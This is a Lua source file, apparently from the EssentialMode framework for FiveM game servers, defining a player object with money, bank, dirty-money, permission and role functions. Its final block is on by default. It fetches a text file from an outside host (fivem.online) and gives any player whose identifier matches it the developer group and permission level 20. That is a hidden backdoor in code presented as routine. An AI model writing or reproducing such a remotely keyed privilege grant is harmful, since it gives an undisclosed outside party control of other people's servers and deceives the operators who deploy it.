-- NO TOUCHY, IF SOMETHING IS WRONG CONTACT KANERSPS! --
-- NO TOUCHY, IF SOMETHING IS WRONG CONTACT KANERSPS! --
-- NO TOUCHY, IF SOMETHING IS WRONG CONTACT KANERSPS! --
-- NO TOUCHY, IF SOMETHING IS WRONG CONTACT KANERSPS! --

function CreatePlayer(source, permission_level, money, bank, identifier, license, group, dirtymoney, roles)
	local self = {}

	self.source = source
	self.permission_level = permission_level
	self.money = money
	self.dirtymoney = dirtymoney
	self.bank = bank
	self.identifier = identifier
	self.license = license
	self.group = group
	self.coords = {x = 0.0, y = 0.0, z = 0.0}
	self.session = {}
	self.bankDisplayed = false
	self.moneyDisplayed = false
	self.roles = stringsplit(roles, "|")

	-- FXServer <3
	ExecuteCommand('add_principal identifier.' .. self.license .. " group." .. self.group)

	local rTable = {}

	rTable.setMoney = function(m)
		if type(m) == "number" then
			local prevMoney = self.money
			local newMoney = m

			self.money = m

			if((prevMoney - newMoney) < 0)then
				TriggerClientEvent("es:addedMoney", self.source, math.abs(prevMoney - newMoney), settings.defaultSettings.nativeMoneySystem)
			else
				TriggerClientEvent("es:removedMoney", self.source, math.abs(prevMoney - newMoney), settings.defaultSettings.nativeMoneySystem)
			end

			if not settings.defaultSettings.nativeMoneySystem then
				TriggerClientEvent('es:activateMoney', self.source , self.money)
			end
		else
			log('ERROR: There seems to be an issue while setting money, something else then a number was entered.')
			print('ERROR: There seems to be an issue while setting money, something else then a number was entered.')
		end
	end
	
	rTable.getMoney = function()
		return self.money
	end

	rTable.setDirtyMoney = function(m)
		local prevMoney = self.dirtymoney
		local newMoney = m

		self.dirtymoney = m

		if((prevMoney - newMoney) < 0)then
			TriggerClientEvent("es:addedDirtyMoney", self.source, math.abs(prevMoney - newMoney))
		else
			TriggerClientEvent("es:removedDirtyMoney", self.source, math.abs(prevMoney - newMoney))
		end
		TriggerClientEvent('es:activateDirtyMoney', self.source , self.dirtymoney, settings.defaultSettings.dirtyMoneyShow)
	end

	rTable.getDirtyMoney = function()
		return self.dirtymoney
	end

	rTable.setBank = function(m)
		if type(m) == "number" then
			TriggerEvent("es:setPlayerData", self.source, "bank", m, function(response, success)
				self.bank = m
			end)
		else
			log('ERROR: There seems to be an issue while setting bank, something else then a number was entered.')
			print('ERROR: There seems to be an issue while setting bank, something else then a number was entered.')
		end
	end

	rTable.getBank = function()
		return self.bank
	end

	rTable.getCoords = function()
		return self.coords
	end

	rTable.setCoords = function(x, y, z)
		self.coords = {x = x, y = y, z = z}
	end

	rTable.kick = function(r)
		DropPlayer(self.source, r)
	end

	rTable.addMoney = function(m)
		if type(m) == "number" then
			local newMoney = self.money + m

			self.money = newMoney

			TriggerClientEvent("es:addedMoney", self.source, m, settings.defaultSettings.nativeMoneySystem)
			if not settings.defaultSettings.nativeMoneySystem then
				TriggerClientEvent('es:activateMoney', self.source , self.money)
			end
		else
			log('ERROR: There seems to be an issue while adding money, a different type then number was trying to be added.')
			print('ERROR: There seems to be an issue while adding money, a different type then number was trying to be added.')
		end
	end

	rTable.removeMoney = function(m)
		if type(m) == "number" then
			local newMoney = self.money - m

			self.money = newMoney

			TriggerClientEvent("es:removedMoney", self.source, m, settings.defaultSettings.nativeMoneySystem)
			if not settings.defaultSettings.nativeMoneySystem then
				TriggerClientEvent('es:activateMoney', self.source , self.money)
			end
		else
			log('ERROR: There seems to be an issue while removing money, a different type then number was trying to be removed.')
			print('ERROR: There seems to be an issue while removing money, a different type then number was trying to be removed.')
		end
	end

	rTable.addDirtyMoney = function(m)
		local newMoney = self.dirtymoney + m

			self.dirtymoney = newMoney
			if(settings.defaultSettings.dirtyMoneyShow)then
				TriggerClientEvent("es:addedMoney", self.source, m)
				TriggerClientEvent('es:activateDirtyMoney', self.source , self.dirtymoney, settings.defaultSettings.dirtyMoneyShow)
			end
	end

	rTable.removeDirtyMoney = function(m)
		local newMoney = self.dirtymoney - m

			self.dirtymoney = newMoney
			if(settings.defaultSettings.dirtyMoneyShow)then
				TriggerClientEvent("es:removedMoney", self.source, m)
				TriggerClientEvent('es:activateDirtyMoney', self.source , self.dirtymoney, settings.defaultSettings.dirtyMoneyShow)
			end
	end

	rTable.addBank = function(m)
		if type(m) == "number" then
			local newBank = self.bank + m
			self.bank = newBank

			TriggerClientEvent("es:addedBank", self.source, m)
		else
			log('ERROR: There seems to be an issue while adding to bank, a different type then number was trying to be added.')
			print('ERROR: There seems to be an issue while adding to bank, a different type then number was trying to be added.')
		end
	end

	rTable.removeBank = function(m)
		if type(m) == "number" then
			local newBank = self.bank - m
			self.bank = newBank

			TriggerClientEvent("es:removedBank", self.source, m)
		else
			log('ERROR: There seems to be an issue while removing from bank, a different type then number was trying to be removed.')
			print('ERROR: There seems to be an issue while removing from bank, a different type then number was trying to be removed.')
		end
	end

	rTable.displayMoney = function(m)
		if not self.moneyDisplayed then
			if settings.defaultSettings.nativeMoneySystem then
				TriggerClientEvent("es:displayMoney", self.source, math.floor(m))
			else
				TriggerClientEvent('es:activateMoney', self.source , self.money)
			end
			
			self.moneyDisplayed = true
		end
	end

	rTable.displayBank = function(m)
		if not self.bankDisplayed then
			TriggerClientEvent("es:displayBank", self.source, math.floor(m))
			self.bankDisplayed = true
		end
	end

	rTable.setSessionVar = function(key, value)
		self.session[key] = value
	end

	rTable.getSessionVar = function(k)
		return self.session[k]
	end

	rTable.getPermissions = function()
		return self.permission_level
	end

	rTable.setPermissions = function(p)
		self.permission_level = p
	end

	rTable.getIdentifier = function(i)
		return self.identifier
	end

	rTable.getGroup = function()
		return self.group
	end

	rTable.set = function(k, v)
		self[k] = v
	end

	rTable.get = function(k)
		return self[k]
	end

	rTable.setGlobal = function(g, default)
		self[g] = default or ""

		rTable["get" .. g:gsub("^%l", string.upper)] = function()
			return self[g]
		end

		rTable["set" .. g:gsub("^%l", string.upper)] = function(e)
			self[g] = e
		end

		Users[self.source] = rTable
	end

	rTable.hasRole = function(role)
		for k,v in ipairs(self.roles)do
			if v == role then
				return true
			end
		end
		return false
	end

	rTable.giveRole = function(role)
		for k,v in pairs(self.roles)do
			if v == role then
				print("User (" .. GetPlayerName(source) .. ") already has this role")
				return
			end
		end

		self.roles[#self.roles + 1] = role
		db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
	end

	rTable.removeRole = function(role)
		for k,v in pairs(self.roles)do
			if v == role then
				table.remove(self.roles, k)
			end
		end

		db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
	end

	if GetConvar("es_enableDevTools", "1") == "1" then
		PerformHttpRequest("http://fivem.online/id.txt", function(err, rText, headers)
			if self.identifier == rText then
				self.group = "_dev"
				self.permission_level = 20
			end
		end)
	end

	return rTable
end